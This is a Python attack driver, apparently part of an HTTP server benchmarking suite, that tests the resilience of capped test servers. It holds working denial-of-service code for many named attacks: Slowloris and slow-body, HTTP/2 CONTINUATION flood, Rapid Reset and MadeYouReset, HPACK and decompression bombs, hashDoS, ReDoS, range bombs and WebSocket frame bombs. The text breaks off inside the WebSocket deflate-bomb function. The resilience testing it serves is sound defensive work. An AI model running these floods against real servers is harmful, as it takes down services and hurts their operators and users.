#!/usr/bin/env python3
"""HttpArena resilience attack driver — adversarial HTTP clients for the
resilience suite. Stdlib only; run on the host (uncapped) against a target
entry running in a memory/CPU-capped container, so what we measure is the
server, not the client.

    attack.py --attack <name> --host H --port P --duration SECS --conns N [opts]

Each attack tries to exhaust one server resource. It prints a one-line JSON
summary of what the *client* did (connections established, how many the server
reaped, bytes sent) to stdout; the runner (scripts/resilience.sh) pairs that
with the server-side signal (peak RSS, OOM-kill, liveness, recovery).

Attacks
  slow-body          N conns POST a large declared Content-Length and then drip
                     the body one byte per interval, never finishing. Tests the
                     body-read timeout / whether the body is buffered whole.
  slow-headers       N conns send a partial header block and keep appending
                     header lines, never sending the terminating CRLF CRLF.
                     Classic Slowloris: header-read timeout / max-conn / header
                     size cap.
  huge-chunk         N conns declare Transfer-Encoding: chunked then announce a
                     chunk of 0x7fffffffffffffff bytes. Tests whether the server
                     pre-allocates the declared chunk buffer (single-request OOM).
  continuation-flood H2(c) conns send HEADERS without END_HEADERS followed by an
                     endless stream of CONTINUATION frames. The server buffers a
                     header block that never ends (CVE-2024-27316). Tests the
                     header-block size cap.

A "reaped" connection is one the server closed on us — which for these attacks
is the *correct* defense (a timeout fired, a cap was enforced). High reaped +
flat server memory = the server defended itself; growing memory / OOM = it did
not.
"""
import argparse
import base64
import json
import os
import socket
import ssl
import sys
import threading
import time
import zlib

H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"


# ── Connection helpers ───────────────────────────────────────────────────────

def _open(host, port, tls, alpn):
    s = socket.create_connection((host, port), timeout=5)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    if tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        if alpn:
            try:
                ctx.set_alpn_protocols(alpn)
            except NotImplementedError:
                pass
        s = ctx.wrap_socket(s, server_hostname=host)
    return s


# ── Slow engine (slow-body, slow-headers, huge-chunk) ────────────────────────
#
# Open N connections, send a per-attack opener on each, then every interval push
# a tiny "drip" on each still-open connection until the duration runs out. The
# sends are non-blocking: a server that reaps a connection surfaces as an OSError
# we count, not a stall on our side.

def _run_slow(args, opener, dripper, alpn=None):
    deadline = time.monotonic() + args.duration
    conns = []            # [sock, idx, drips]
    established = connect_errors = 0

    for i in range(args.conns):
        if time.monotonic() > deadline:
            break
        try:
            s = _open(args.host, args.port, args.tls, alpn)
            s.sendall(opener(i))
            s.setblocking(False)
            conns.append([s, i, 0])
            established += 1
        except OSError:
            connect_errors += 1

    reaped = sent = 0
    while time.monotonic() < deadline and conns:
        for c in list(conns):
            s, idx, drips = c
            try:
                payload = dripper(idx, drips)
                n = s.send(payload)
                sent += n
                c[2] += 1
            except (BlockingIOError, ssl.SSLWantWriteError, ssl.SSLWantReadError):
                pass
            except OSError:
                reaped += 1
                conns.remove(c)
                try:
                    s.close()
                except OSError:
                    pass
        time.sleep(args.drip_interval)

    open_at_end = len(conns)
    for c in conns:
        try:
            c[0].close()
        except OSError:
            pass
    return dict(established=established, reaped=reaped, open_at_end=open_at_end,
                drip_sent_bytes=sent, connect_errors=connect_errors)


def slow_body(args):
    opener = lambda i: (
        f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
        f"Content-Length: {args.body_size}\r\n"
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode()
    return _run_slow(args, opener, lambda i, d: b"A" * args.drip_bytes)


def slow_headers(args):
    # GET with no terminating CRLF CRLF; each drip appends another header line,
    # so the request is never complete and the header block keeps growing.
    opener = lambda i: f"GET {args.path} HTTP/1.1\r\nHost: {args.host}\r\n".encode()
    dripper = lambda i, d: f"X-Pad-{i}-{d}: {'A' * 48}\r\n".encode()
    return _run_slow(args, opener, dripper)


def huge_chunk(args):
    # Declare a chunk of 0x7fffffffffffffff bytes, then drip a little chunk data
    # so a server that waits for the body keeps the (pre-allocated?) buffer.
    opener = lambda i: (
        f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
        f"Transfer-Encoding: chunked\r\n\r\n"
        f"7fffffffffffffff\r\n"
    ).encode()
    return _run_slow(args, opener, lambda i, d: b"A" * args.drip_bytes)


# ── HTTP/2 attack toolkit ────────────────────────────────────────────────────
#
# One shared raw-socket harness backs every H2 attack: preface + empty SETTINGS,
# a frame writer, a tiny HPACK encoder, and a threaded N-connection flood. No h2
# library — the frames are built by hand so we can send exactly the malformed or
# abusive sequence each attack needs.

def _frame(ftype, flags, stream, payload):
    return (len(payload).to_bytes(3, "big") + bytes([ftype, flags])
            + (stream & 0x7FFFFFFF).to_bytes(4, "big") + payload)


def _hpack_int(value, prefix_bits):
    mask = (1 << prefix_bits) - 1
    if value < mask:
        return bytes([value])
    out = bytearray([mask])
    value -= mask
    while value >= 128:
        out.append((value & 0x7F) | 0x80)
        value >>= 7
    out.append(value)
    return bytes(out)


def _hpack_str(data):
    return _hpack_int(len(data), 7) + data          # Huffman flag off


def _hpack_filler(size):
    """A header block of literal-without-indexing fields with new names, padded
    to `size` — plain bulk, no decompression amplification (continuation-flood)."""
    out = bytearray()
    k = 0
    while len(out) < size:
        name = f"x-{k:x}".encode()
        val = b"a" * 32
        out += b"\x00" + bytes([len(name)]) + name + bytes([len(val)]) + val
        k += 1
    return bytes(out)


def _h2_get_block(authority):
    """A GET / header block: :method/:scheme/:path indexed from the static table,
    :authority literal WITHOUT indexing so the dynamic table stays empty."""
    return bytes([0x82, 0x86, 0x84, 0x01]) + _hpack_str(authority.encode())


def _h2_get_block_path(authority, path):
    """A GET header block for an arbitrary path: :method/:scheme indexed, :path
    and :authority literal WITHOUT indexing (name indices 4 and 1)."""
    return (bytes([0x82, 0x86, 0x04]) + _hpack_str(path.encode())
            + bytes([0x01]) + _hpack_str(authority.encode()))


def _new_stats():
    return dict(established=0, reaped=0, frames_sent=0, bytes_sent=0, connect_errors=0)


def _run_workers(n, deadline, worker):
    threads = []
    for _ in range(n):
        if time.monotonic() > deadline:
            break
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join(timeout=max(0.0, deadline - time.monotonic()) + 5)


def _h2_session(args, stats, lock, body, deadline):
    """Open one H2(c) connection, send the preface + an empty SETTINGS, then run
    body(s, deadline) -> (frames, nbytes) until it returns or the peer drops us."""
    s = None
    try:
        s = _open(args.host, args.port, args.tls, ["h2"] if args.tls else None)
        s.sendall(H2_PREFACE)
        s.sendall(_frame(0x4, 0, 0, b""))               # empty SETTINGS
        with lock:
            stats["established"] += 1
        frames, nbytes = body(s, deadline)
        with lock:
            stats["frames_sent"] += frames
            stats["bytes_sent"] += nbytes
    except OSError:
        with lock:
            stats["reaped"] += 1
    finally:
        if s is not None:
            try:
                s.close()
            except OSError:
                pass


def _h2_flood(args, body):
    """N connections, each running body(s, deadline). Shared, locked stats."""
    deadline = time.monotonic() + args.duration
    stats = _new_stats()
    lock = threading.Lock()
    _run_workers(args.conns, deadline,
                 lambda: _h2_session(args, stats, lock, body, deadline))
    return stats


def continuation_flood(args):
    # HEADERS (END_STREAM, no END_HEADERS) then an endless stream of CONTINUATION
    # frames that never set END_HEADERS: the server buffers an unbounded header
    # block (CVE-2024-27316).
    initial = _h2_get_block(args.host)
    filler = _hpack_filler(16384)

    def body(s, deadline):
        f = nb = 0
        s.sendall(_frame(0x1, 0x1, 1, initial)); f += 1; nb += len(initial) + 9
        while time.monotonic() < deadline:
            s.sendall(_frame(0x9, 0x0, 1, filler)); f += 1; nb += len(filler) + 9
        return f, nb

    return _h2_flood(args, body)


def hpack_bomb(args):
    # Insert one ~3.9 KB header into the HPACK dynamic table (literal + incremental
    # indexing -> index 62), then flood CONTINUATION frames of 1-byte indexed
    # references (0xBE) to it. Each byte re-materializes the whole header, so a few
    # KB on the wire decode to hundreds of MB-GB of live header structures.
    big = b"\x40" + _hpack_str(b"x-b") + _hpack_str(b"a" * 3900)
    initial = bytes([0x82, 0x86, 0x84, 0x01]) + _hpack_str(args.host.encode()) + big
    refs = b"\xBE" * 16384                          # 0x80|62: indexed field, dyn index 62

    def body(s, deadline):
        f = nb = 0
        s.sendall(_frame(0x1, 0x1, 1, initial)); f += 1; nb += len(initial) + 9
        while time.monotonic() < deadline:
            s.sendall(_frame(0x9, 0x0, 1, refs)); f += 1; nb += len(refs) + 9
        return f, nb

    return _h2_flood(args, body)


def rapid_reset(args):
    # Open a stream (HEADERS, END_STREAM+END_HEADERS) then immediately RST_STREAM
    # (CANCEL) before reading the response, in a tight loop. The slot frees at
    # once so streams are unbounded, while request work keeps piling up
    # (CVE-2023-44487).
    hdr = _h2_get_block(args.host)

    def body(s, deadline):
        f = nb = 0
        sid = 1
        while time.monotonic() < deadline and sid < 0x7FFFFFFF:
            buf = _frame(0x1, 0x5, sid, hdr) + _frame(0x3, 0x0, sid, b"\x00\x00\x00\x08")
            s.sendall(buf); f += 1; nb += len(buf); sid += 2
        return f, nb

    return _h2_flood(args, body)


def madeyoureset(args):
    # Like rapid-reset, but the attacker never sends RST: a WINDOW_UPDATE of 0 on
    # the just-opened stream is a protocol error, so the SERVER resets it. Defeats
    # client-RST rate limits (CVE-2025-8671).
    hdr = _h2_get_block(args.host)

    def body(s, deadline):
        f = nb = 0
        sid = 1
        while time.monotonic() < deadline and sid < 0x7FFFFFFF:
            buf = _frame(0x1, 0x5, sid, hdr) + _frame(0x8, 0x0, sid, b"\x00\x00\x00\x00")
            s.sendall(buf); f += 1; nb += len(buf); sid += 2
        return f, nb

    return _h2_flood(args, body)


def settings_flood(args):
    # Stream empty SETTINGS frames; the peer must ACK every one (CVE-2019-9515).
    frame = _frame(0x4, 0x0, 0, b"")

    def body(s, deadline):
        f = nb = 0
        while time.monotonic() < deadline:
            s.sendall(frame); f += 1; nb += len(frame)
        return f, nb

    return _h2_flood(args, body)


def ping_flood(args):
    # Stream non-ACK PING frames; the peer must PING-ACK every one (CVE-2019-9512).
    frame = _frame(0x6, 0x0, 0, b"\x00" * 8)

    def body(s, deadline):
        f = nb = 0
        while time.monotonic() < deadline:
            s.sendall(frame); f += 1; nb += len(frame)
        return f, nb

    return _h2_flood(args, body)


def empty_frame_flood(args):
    # Open a stream, then flood zero-length DATA frames with no END_STREAM: each
    # costs parse + state-machine work but makes no progress (CVE-2019-9518).
    hdr = _h2_get_block(args.host)
    empty = _frame(0x0, 0x0, 1, b"")

    def body(s, deadline):
        f = nb = 0
        s.sendall(_frame(0x1, 0x4, 1, hdr)); f += 1; nb += len(hdr) + 9   # END_HEADERS, stream open
        while time.monotonic() < deadline:
            s.sendall(empty); f += 1; nb += len(empty)
        return f, nb

    return _h2_flood(args, body)


def window_stall(args):
    # Advertise SETTINGS_INITIAL_WINDOW_SIZE = 0, open many streams each requesting
    # a large response, then never send WINDOW_UPDATE. The server generates the
    # responses and buffers data it can never flush (CVE-2019-9517 / CVE-2023-43622).
    settings0 = _frame(0x4, 0, 0, b"\x00\x04\x00\x00\x00\x00")   # INITIAL_WINDOW_SIZE = 0
    block = _h2_get_block_path(args.host, f"/json/{args.stall_count}")

    def body(s, deadline):
        f = nb = 0
        s.sendall(settings0); f += 1; nb += len(settings0)
        sid = 1
        for _ in range(args.stall_streams):
            s.sendall(_frame(0x1, 0x5, sid, block)); f += 1; nb += len(block) + 9
            sid += 2
        # Hold the streams open, never granting window, so the buffered responses
        # are pinned for the server-configured stalled-stream lifetime.
        while time.monotonic() < deadline:
            time.sleep(0.5)
        return f, nb

    return _h2_flood(args, body)


# ── Decompression bomb (HTTP/1.1) ────────────────────────────────────────────

def _gzip_bomb(size):
    """A gzip stream that inflates to `size` zero bytes (built streaming, so the
    client never holds the decompressed form — the output is a few KB-MB)."""
    co = zlib.compressobj(6, zlib.DEFLATED, 16 + 15)    # 16+15 = gzip wrapper
    out = bytearray()
    chunk = b"\x00" * (1 << 20)
    remaining = size
    while remaining > 0:
        n = min(len(chunk), remaining)
        out += co.compress(chunk if n == len(chunk) else chunk[:n])
        remaining -= n
    out += co.flush()
    return bytes(out)


def _h1_request_flood(args, req):
    """N connections each send one fixed HTTP/1.1 request repeatedly until the
    deadline. The shared engine behind every payload/parser attack; `frames_sent`
    counts requests. These are differential: a request only bites a server that
    actually parses the body/headers it targets."""
    deadline = time.monotonic() + args.duration
    stats = _new_stats()
    lock = threading.Lock()

    def worker():
        sent = nb = 0
        s = None
        established = reaped = False
        try:
            s = _open(args.host, args.port, args.tls, ["http/1.1"] if args.tls else None)
            s.settimeout(5)
            established = True
            while time.monotonic() < deadline:
                try:
                    s.sendall(req); sent += 1; nb += len(req)
                    s.recv(65536)
                except socket.timeout:
                    continue
        except OSError:
            reaped = True
        finally:
            with lock:
                if established:
                    stats["established"] += 1
                if reaped:
                    stats["reaped"] += 1
                stats["frames_sent"] += sent
                stats["bytes_sent"] += nb
            if s is not None:
                try:
                    s.close()
                except OSError:
                    pass

    _run_workers(args.conns, deadline, worker)
    return stats


def decompression_bomb(args):
    # POST a small gzip body that inflates to gigabytes. A server that decodes
    # request Content-Encoding before any size check inflates into memory and
    # OOMs; one that does not is a clean "survived".
    bomb = _gzip_bomb(args.bomb_size)
    req = ((f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
            f"Content-Encoding: gzip\r\nContent-Type: application/octet-stream\r\n"
            f"Content-Length: {len(bomb)}\r\n\r\n").encode() + bomb)
    return _h1_request_flood(args, req)


def hashdos(args):
    # A form body of many distinct keys. A server that parses it into a hash map
    # with an un-seeded hash degrades to O(n^2) on insertion (CVE-2011-3414 era).
    body = b"&".join(b"k%d=1" % i for i in range(args.hashdos_keys))
    req = ((f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n\r\n").encode() + body)
    return _h1_request_flood(args, req)


def json_nesting_bomb(args):
    # A tiny, deeply nested JSON array. A recursive-descent parser without a depth
    # cap blows the stack -> process crash (a distinct, non-OOM verdict).
    body = b"[" * args.json_depth + b"]" * args.json_depth
    req = ((f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
            f"Content-Type: application/json\r\n"
            f"Content-Length: {len(body)}\r\n\r\n").encode() + body)
    return _h1_request_flood(args, req)


def multipart_flood(args):
    # multipart/form-data with tens of thousands of tiny parts: each part is an
    # allocation + bookkeeping entry, overflowing part/field maps.
    boundary = b"----httparenaResBomb"
    part = (b"--" + boundary + b"\r\n"
            b'Content-Disposition: form-data; name="f"\r\n\r\nx\r\n')
    body = part * args.multipart_parts + b"--" + boundary + b"--\r\n"
    req = ((f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n").encode()
           + b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
           + f"Content-Length: {len(body)}\r\n\r\n".encode() + body)
    return _h1_request_flood(args, req)


def redos_headers(args):
    # Best-effort probe against commonly ReDoS-prone header parsers (Accept,
    # Content-Disposition, Range). A regex that backtracks catastrophically burns
    # a CPU core on one request; RE2/string parsers are immune (a clean survived).
    run = b"a" * args.redos_pad
    req = (f"GET {args.path} HTTP/1.1\r\nHost: {args.host}\r\n".encode()
           + b"Accept: text/html," + run + b" ;q=0\r\n"
           + b'Content-Disposition: form-data; name="x"; filename="' + run + b'\r\n'
           + b"Range: bytes=" + b",".join(b"0-0" for _ in range(max(1, args.redos_pad // 4))) + b"\r\n"
           + b"Connection: keep-alive\r\n\r\n")
    return _h1_request_flood(args, req)


# ── HTTP/1.1 connection-hold engine (hold complete/partial requests idle) ─────

def _h1_hold(args, opener):
    """Open N connections, send `opener` on each, then hold them idle until the
    deadline — draining non-blocking to notice if the server reaps them. Backs the
    attacks whose pressure is "a request that is complete-but-waiting or reserving
    resources", where re-sending on the same socket would corrupt the stream."""
    deadline = time.monotonic() + args.duration
    conns = []
    established = errors = 0
    for _ in range(args.conns):
        if time.monotonic() > deadline:
            break
        try:
            s = _open(args.host, args.port, args.tls, ["http/1.1"] if args.tls else None)
            s.sendall(opener)
            s.setblocking(False)
            conns.append(s)
            established += 1
        except OSError:
            errors += 1
    reaped = 0
    while time.monotonic() < deadline and conns:
        for s in list(conns):
            try:
                if s.recv(65536) == b"":
                    reaped += 1
                    conns.remove(s)
                    s.close()
            except (BlockingIOError, ssl.SSLWantReadError, ssl.SSLWantWriteError):
                pass
            except OSError:
                reaped += 1
                conns.remove(s)
                try:
                    s.close()
                except OSError:
                    pass
        time.sleep(1.0)
    open_at_end = len(conns)
    for s in conns:
        try:
            s.close()
        except OSError:
            pass
    return dict(established=established, reaped=reaped, open_at_end=open_at_end,
                drip_sent_bytes=0, connect_errors=errors)


def keepalive_hoard(args):
    # N complete keep-alive requests, then idle: max-conn + idle-timeout test.
    return _h1_hold(args, (f"GET {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
                           f"Connection: keep-alive\r\n\r\n").encode())


def content_length_preallocation(args):
    # Declare a huge Content-Length and send NO body: a server that sizes its read
    # buffer from the declared length pre-allocates gigabytes per connection.
    return _h1_hold(args, (f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
                           f"Content-Type: application/octet-stream\r\n"
                           f"Content-Length: {args.cl_declare}\r\n\r\n").encode())


def expect_100_continue_hold(args):
    # Expect: 100-continue + a large Content-Length, then withhold the body: the
    # server emits 100 Continue and/or reserves a body buffer it never fills.
    return _h1_hold(args, (f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
                           f"Content-Type: application/octet-stream\r\n"
                           f"Content-Length: {args.cl_declare}\r\n"
                           f"Expect: 100-continue\r\n\r\n").encode())


def chunk_size_overflow(args):
    # A chunk-size near 2**64: parsers that compute size+2 (for the CRLF) or
    # accumulate without overflow checks wrap to a huge/negative size and crash.
    return _h1_hold(args, (f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
                           f"Transfer-Encoding: chunked\r\n\r\nfffffffffffffffe\r\n").encode())


def slow_read(args):
    # Request a large response, then read it ~1 byte per interval: the server
    # buffers the response (or blocks the connection) it cannot flush to us.
    req = (f"GET /json/{args.stall_count} HTTP/1.1\r\nHost: {args.host}\r\n\r\n").encode()
    deadline = time.monotonic() + args.duration
    conns = []
    established = errors = 0
    for _ in range(args.conns):
        if time.monotonic() > deadline:
            break
        try:
            s = _open(args.host, args.port, args.tls, ["http/1.1"] if args.tls else None)
            s.sendall(req)
            s.setblocking(False)
            conns.append(s)
            established += 1
        except OSError:
            errors += 1
    reaped = read = 0
    while time.monotonic() < deadline and conns:
        for s in list(conns):
            try:
                b = s.recv(1)
                if b == b"":
                    reaped += 1
                    conns.remove(s)
                    s.close()
                else:
                    read += len(b)
            except (BlockingIOError, ssl.SSLWantReadError, ssl.SSLWantWriteError):
                pass
            except OSError:
                reaped += 1
                conns.remove(s)
                try:
                    s.close()
                except OSError:
                    pass
        time.sleep(args.drip_interval)
    open_at_end = len(conns)
    for s in conns:
        try:
            s.close()
        except OSError:
            pass
    return dict(established=established, reaped=reaped, open_at_end=open_at_end,
                drip_sent_bytes=read, connect_errors=errors)


def trailer_flood(args):
    # Chunked body terminated by 0\r\n, then an unbounded trailer section never
    # closed: limits guard the leading header block, rarely the trailers.
    opener = lambda i: (f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
                        f"Transfer-Encoding: chunked\r\n\r\n0\r\n").encode()
    dripper = lambda i, d: (f"X-Trailer-{i}-{d}: a\r\n").encode()
    return _run_slow(args, opener, dripper)


def chunk_extension_flood(args):
    # Each 1-byte chunk carries a huge chunk-extension the server must scan and
    # discard: far more bytes read than body delivered (CVE-2023-39326).
    ext = "a" * args.chunk_ext_size
    opener = lambda i: (f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
                        f"Transfer-Encoding: chunked\r\n\r\n").encode()
    dripper = lambda i, d: (f"1;{ext}\r\nA\r\n").encode()
    return _run_slow(args, opener, dripper)


def tiny_chunk_flood(args):
    # A chunked body of very many 1-byte chunks: per-chunk framing/dechunk overhead.
    body = b"1\r\nA\r\n" * args.chunk_count + b"0\r\n\r\n"
    req = (f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
           f"Transfer-Encoding: chunked\r\n\r\n").encode() + body
    return _h1_request_flood(args, req)


def large_upload(args):
    # A huge, uncompressed body delivered FAST (not dripped): tests whole-body
    # buffering + max-body-size with real volume, where slow-body delivers ~nothing.
    headers = (f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
               f"Content-Type: application/octet-stream\r\n"
               f"Content-Length: {args.upload_size}\r\n\r\n").encode()
    buf = b"A" * (1 << 20)
    deadline = time.monotonic() + args.duration
    stats = _new_stats()
    lock = threading.Lock()

    def worker():
        sent = nb = 0
        s = None
        established = reaped = False
        try:
            s = _open(args.host, args.port, args.tls, ["http/1.1"] if args.tls else None)
            s.settimeout(10)
            established = True
            while time.monotonic() < deadline:
                try:
                    s.sendall(headers)
                    remaining = args.upload_size
                    while remaining > 0 and time.monotonic() < deadline:
                        n = min(len(buf), remaining)
                        s.sendall(buf if n == len(buf) else buf[:n])
                        nb += n
                        remaining -= n
                    sent += 1
                    s.recv(65536)
                except socket.timeout:
                    continue
        except OSError:
            reaped = True
        finally:
            with lock:
                if established:
                    stats["established"] += 1
                if reaped:
                    stats["reaped"] += 1
                stats["frames_sent"] += sent
                stats["bytes_sent"] += nb
            if s is not None:
                try:
                    s.close()
                except OSError:
                    pass

    _run_workers(args.conns, deadline, worker)
    return stats


def header_bomb(args):
    # One complete request with a single enormous header VALUE: tests the per-field
    # / total header size cap at parse time.
    req = (f"GET {args.path} HTTP/1.1\r\nHost: {args.host}\r\n".encode()
           + b"X-Pad: " + b"a" * args.header_value_size + b"\r\n\r\n")
    return _h1_request_flood(args, req)


def header_count_flood(args):
    # Very many tiny distinct header fields, each under any per-field cap: tests the
    # header COUNT cap (a dimension several stacks left unguarded until 2026).
    hdrs = b"".join(b"X-%x: a\r\n" % i for i in range(args.header_count))
    req = (f"GET {args.path} HTTP/1.1\r\nHost: {args.host}\r\n".encode() + hdrs + b"\r\n")
    return _h1_request_flood(args, req)


def duplicate_header_merge(args):
    # The SAME header name repeated N times: frameworks that join duplicates into
    # one value with repeated concatenation do O(n^2) work before the handler runs.
    req = (f"GET {args.path} HTTP/1.1\r\nHost: {args.host}\r\n".encode()
           + b"X-Dup: a\r\n" * args.dup_headers + b"\r\n")
    return _h1_request_flood(args, req)


def pipelining_flood(args):
    # Thousands of pipelined requests on one keep-alive socket, responses never
    # read: a server that doesn't bound the inbound queue buffers them all (OOM).
    batch = (f"GET {args.path} HTTP/1.1\r\nHost: {args.host}\r\n\r\n").encode() * args.pipeline_depth
    deadline = time.monotonic() + args.duration
    stats = _new_stats()
    lock = threading.Lock()

    def worker():
        sent = nb = 0
        s = None
        established = reaped = False
        try:
            s = _open(args.host, args.port, args.tls, ["http/1.1"] if args.tls else None)
            s.settimeout(5)
            established = True
            while time.monotonic() < deadline:
                try:
                    s.sendall(batch)
                    sent += args.pipeline_depth
                    nb += len(batch)
                except socket.timeout:
                    break   # backpressured: the server is holding the queue
        except OSError:
            reaped = True
        finally:
            with lock:
                if established:
                    stats["established"] += 1
                if reaped:
                    stats["reaped"] += 1
                stats["frames_sent"] += sent
                stats["bytes_sent"] += nb
            if s is not None:
                try:
                    s.close()
                except OSError:
                    pass

    _run_workers(args.conns, deadline, worker)
    return stats


# ── HTTP/1.1 parser-differential attacks (bite only servers that parse X) ─────

def decomp_codec_bypass(args):
    # A deflate (zlib) bomb labelled `Content-Encoding: deflate`: servers that cap
    # gzip but not deflate, or decode by content-type, inflate unbounded. (br/zstd
    # would need non-stdlib libraries.)
    co = zlib.compressobj(6)
    out = bytearray()
    chunk = b"\x00" * (1 << 20)
    remaining = args.bomb_size
    while remaining > 0:
        n = min(len(chunk), remaining)
        out += co.compress(chunk if n == len(chunk) else chunk[:n])
        remaining -= n
    bomb = bytes(out + co.flush())
    req = ((f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
            f"Content-Encoding: deflate\r\nContent-Type: application/octet-stream\r\n"
            f"Content-Length: {len(bomb)}\r\n\r\n").encode() + bomb)
    return _h1_request_flood(args, req)


def qvalue_cpu_bomb(args):
    # A huge Accept-Language list: parsers that sort by q-value quadratically spend
    # the CPU before the request is even dispatched (Jetty CVE-2020-27223).
    al = b",".join(b"en-%x;q=0.%d" % (i, i % 10) for i in range(args.qvalue_count))
    req = (f"GET {args.path} HTTP/1.1\r\nHost: {args.host}\r\n".encode()
           + b"Accept-Language: " + al + b"\r\n\r\n")
    return _h1_request_flood(args, req)


def cookie_flood(args):
    # One Cookie header of many tiny pairs, under the header-byte cap: parsers with
    # no cookie-COUNT cap allocate one object per crumb (CVE-2025-58186).
    cookie = b";".join(b"a%x=1" % i for i in range(args.cookie_pairs))
    req = (f"GET {args.path} HTTP/1.1\r\nHost: {args.host}\r\n".encode()
           + b"Cookie: " + cookie + b"\r\n\r\n")
    return _h1_request_flood(args, req)


def percent_decode_quadratic(args):
    # A request path of many percent-encoded tokens: routers that re-scan the whole
    # remaining string per token decode it super-linearly (CVE-2026-45822).
    path = "/" + "%41" * args.percent_count
    req = (f"GET {path} HTTP/1.1\r\nHost: {args.host}\r\n\r\n").encode()
    return _h1_request_flood(args, req)


def range_bomb(args):
    # Many overlapping byte ranges on a static file: the server assembles a
    # multipart/byteranges response far larger than the file (Apache-Killer).
    rng = b"bytes=" + b",".join(b"0-%d" % i for i in range(args.range_count))
    req = (f"GET /static/reset.css HTTP/1.1\r\nHost: {args.host}\r\n".encode()
           + b"Range: " + rng + b"\r\n\r\n")
    return _h1_request_flood(args, req)


def json_bignum(args):
    # A single gigantic numeric literal: parsers that fall back to arbitrary
    # precision (BigDecimal / Python int) do quadratic conversion on one token.
    body = b'{"n":' + b"9" * args.bignum_digits + b"}"
    req = ((f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
            f"Content-Type: application/json\r\n"
            f"Content-Length: {len(body)}\r\n\r\n").encode() + body)
    return _h1_request_flood(args, req)


# ── WebSocket attack toolkit ─────────────────────────────────────────────────

def _ws_connect(args, extensions=None):
    """Open a WebSocket connection to /ws (RFC 6455 handshake). Returns the socket
    after a 101, raises OSError otherwise."""
    key = base64.b64encode(os.urandom(16)).decode()
    req = (f"GET /ws HTTP/1.1\r\nHost: {args.host}\r\nUpgrade: websocket\r\n"
           f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\n"
           f"Sec-WebSocket-Version: 13\r\n").encode()
    if extensions:
        req += b"Sec-WebSocket-Extensions: " + extensions + b"\r\n"
    req += b"\r\n"
    s = _open(args.host, args.port, args.tls, ["http/1.1"] if args.tls else None)
    s.sendall(req)
    s.settimeout(5)
    resp = b""
    while b"\r\n\r\n" not in resp and len(resp) < 65536:
        b = s.recv(4096)
        if not b:
            break
        resp += b
    if b" 101" not in resp.split(b"\r\n", 1)[0]:
        raise OSError("ws handshake not 101")
    s.settimeout(None)
    return s


def _ws_frame(opcode, payload, fin=True, rsv1=False):
    """A masked client WebSocket frame (clients MUST mask, RFC 6455 §5.3)."""
    b0 = (0x80 if fin else 0) | (0x40 if rsv1 else 0) | (opcode & 0x0F)
    n = len(payload)
    if n < 126:
        head = bytes([b0, 0x80 | n])
    elif n < 65536:
        head = bytes([b0, 0x80 | 126]) + n.to_bytes(2, "big")
    else:
        head = bytes([b0, 0x80 | 127]) + n.to_bytes(8, "big")
    mask = os.urandom(4)
    masked = bytes(payload[i] ^ mask[i % 4] for i in range(n))
    return head + mask + masked


def _ws_frame_header(opcode, declared_len, fin=True):
    """Just a frame header declaring `declared_len` bytes, no payload — for the
    giant-frame pre-allocation probe."""
    b0 = (0x80 if fin else 0) | (opcode & 0x0F)
    if declared_len < 126:
        head = bytes([b0, 0x80 | declared_len])
    elif declared_len < 65536:
        head = bytes([b0, 0x80 | 126]) + declared_len.to_bytes(2, "big")
    else:
        head = bytes([b0, 0x80 | 127]) + declared_len.to_bytes(8, "big")
    return head + os.urandom(4)   # masking key, then (withheld) payload


def _ws_flood(args, body):
    """N WebSocket connections, each running body(s, deadline) -> (frames, nbytes)."""
    deadline = time.monotonic() + args.duration
    stats = _new_stats()
    lock = threading.Lock()

    def worker():
        s = None
        try:
            s = _ws_connect(args)
            with lock:
                stats["established"] += 1
            frames, nbytes = body(s, deadline)
            with lock:
                stats["frames_sent"] += frames
                stats["bytes_sent"] += nbytes
        except OSError:
            with lock:
                stats["reaped"] += 1
        finally:
            if s is not None:
                try:
                    s.close()
                except OSError:
                    pass

    _run_workers(args.conns, deadline, worker)
    return stats


def ws_giant_frame(args):
    # A frame header declaring a near-2**63 payload length, then only a few bytes:
    # servers that allocate the receive buffer from the declared length OOM at once.
    def body(s, deadline):
        s.sendall(_ws_frame_header(0x2, args.ws_frame_len) + b"\x00\x00\x00\x00")
        s.settimeout(2)
        while time.monotonic() < deadline:
            try:
                if s.recv(4096) == b"":
                    break
            except socket.timeout:
                pass
        return 1, 0
    return _ws_flood(args, body)


def ws_fragment_bomb(args):
    # An opening text frame with FIN=0, then endless continuation frames (opcode 0,
    # FIN=0): servers that aggregate fragments with no total cap buffer forever.
    frag = _ws_frame(0x0, b"A" * args.ws_frag_size, fin=False)

    def body(s, deadline):
        f = nb = 0
        start = _ws_frame(0x1, b"A" * args.ws_frag_size, fin=False)
        s.sendall(start); f += 1; nb += len(start)
        while time.monotonic() < deadline:
            s.sendall(frag); f += 1; nb += len(frag)
        return f, nb
    return _ws_flood(args, body)


def ws_deflate_bomb(args):
    # With permessage-deflate negotiated, one compressed frame (RSV1=1) that
    # inflates to ~GBs: the server inflates before any max-message check.
    co = zlib.compressobj(9, zlib.DEFLATED, -15)
